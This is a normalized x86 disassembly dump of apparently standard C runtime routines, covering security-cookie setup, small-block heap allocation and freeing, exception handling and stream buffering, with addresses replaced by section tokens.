mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1002c53c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1002c4f2
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10020040
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10020040
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_1002c522
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1002c53c
mov eax [ ebp + 0xc ]
push r--data
call sub_1002d530
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10020040
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1002c509
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10020040
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_10028d3c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_10028dd2
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10028e8b
push 0xc
push r--data
call sub_10028b48
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1002ac8b
push 0x1e
call sub_1002aae0
push 0xff
call sub_1002375c
push 0x18
call sub_10026ca5
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_10026065
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10028b8d
retn
push edi
call sub_100207fd
pop ecx
push 0xfa0
push edi
call sub_1002d8b2
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_100207fd
pop ecx
call sub_10026065
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10028f45
mov eax [ ebp - 0x1c ]
sub_10028f4e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10028e8b
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10023708
pop ecx
sub_10028f81
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_10028fb1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10027850
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_100292c7
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10029377
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_1002947f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10029760
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10029377
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_100292c7
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_10029a45
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1002ae89
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10026065
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_10026065
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10022fff
add eax 0x20
